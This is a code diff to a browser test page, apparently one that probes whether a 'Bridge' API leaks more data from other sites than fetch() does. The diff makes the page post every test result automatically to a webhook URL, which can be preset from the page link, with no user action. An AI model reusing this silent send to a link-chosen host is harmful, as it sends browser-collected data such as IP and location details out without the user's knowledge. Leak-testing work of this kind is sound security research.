@@ -206,11 +206,27 @@ https://httpbin.org/anything</textarea>
     return out;
   }
   function pushRaw(obj){
+    // 也保存到results.runs中，避免被覆盖丢失
+    results.runs.push({ type:'extra', data: obj, timestamp: new Date().toISOString() });
     const merged = Object.assign({}, last||{}, { extra: (last&&last.extra)||[] });
     merged.extra = merged.extra || [];
     merged.extra.push(obj);
     last = merged;
     raw.textContent = JSON.stringify(last, null, 2);
+  }
+  
+  // Auto-send to webhook if URL is preset
+  function autoSendWebhook(){
+    try{
+      const hookInput = document.getElementById('hook');
+      const webhookUrl = hookInput?.value?.trim();
+      if (webhookUrl) {
+        setTimeout(()=>{
+          const sendBtn = document.getElementById('send');
+          if (sendBtn) sendBtn.click();
+        }, 300);
+      }
+    }catch{}
   }
   document.getElementById('safeGet').onclick = async ()=>{
     const url = 'https://www.cloudflare.com/cdn-cgi/trace';
@@ -218,6 +234,7 @@ https://httpbin.org/anything</textarea>
     summary.className = 'card';
     summary.innerHTML = `Safe GET → ${url}<br>via: <code>${res.via||'-'}</code> result: <code>${res.result||'-'}</code> ${res.error?`error: <code>${res.error}</code>`:''}`;
     pushRaw({ type:'safe-get', res });
+    autoSendWebhook();
   };
   document.getElementById('multi').onclick = async ()=>{
     const urls = [
@@ -230,6 +247,7 @@ https://httpbin.org/anything</textarea>
     const lines = outAll.map(o=>`${o.url} → ${o.via||'-'} ${o.result||o.error||'-'}`).join('\n');
     out.textContent = lines;
     pushRaw({ type:'multi-domain', results: outAll });
+    autoSendWebhook();
   };
   function parseHeaders(s){
     const o = {};
@@ -263,6 +281,7 @@ https://httpbin.org/anything</textarea>
     }catch(e){ info.error = String(e.message||e); }
     pushRaw(info);
     reqOut.textContent = JSON.stringify(info, null, 2);
+    autoSendWebhook();
   };
   document.getElementById('send').onclick = async ()=>{
     const url = (document.getElementById('hook').value||'').trim();
@@ -335,6 +354,7 @@ https://httpbin.org/anything</textarea>
     pushRaw(info);
     summary.className = 'card';
     summary.innerHTML = `Bridge POST → ${info.url} result: <code>${info.result||info.error||'-'}</code>`;
+    autoSendWebhook();
   };
   document.getElementById('readBody').onclick = async ()=>{
     const info = { type:'read-body', url:'https://httpbin.org/anything' };
@@ -364,6 +384,7 @@ https://httpbin.org/anything</textarea>
       summary.innerHTML = `Read body → ${info.url}<br>via: <code>${via}</code> status: <code>${status}</code>`;
     }catch(e){ info.error = String(e.message||e); }
     pushRaw(info);
+    autoSendWebhook();
   };
   document.getElementById('copy').onclick = ()=>{
     const text = raw.textContent || 'No data';
@@ -520,6 +541,7 @@ https://httpbin.org/anything</textarea>
     summary.innerHTML = any
       ? `⚠️ Oracle泄露检测：在 <strong>${report.summary.urls.filter(x=>x.oracle>0).length}</strong> 个目标中发现Bridge比fetch()泄露了更多信息。`
       : `✅ Oracle测试完成：未发现明显的泄露信号。`;
+    autoSendWebhook();
   }
   
   document.getElementById('runOracle').onclick = runOracleInline;
@@ -535,18 +557,6 @@ https://httpbin.org/anything</textarea>
           hookInput.value = decodeURIComponent(webhookUrl);
         }
       }
-      // Auto-send after Oracle test if webhook is preset
-      const originalRunOracle = runOracleInline;
-      runOracleInline = async function(){
-        await originalRunOracle();
-        setTimeout(()=>{
-          const hookInput = document.getElementById('hook');
-          if (hookInput && hookInput.value.trim()) {
-            const sendBtn = document.getElementById('send');
-            if (sendBtn) sendBtn.click();
-          }
-        }, 500);
-      };
     }catch{}
   })();
 })();
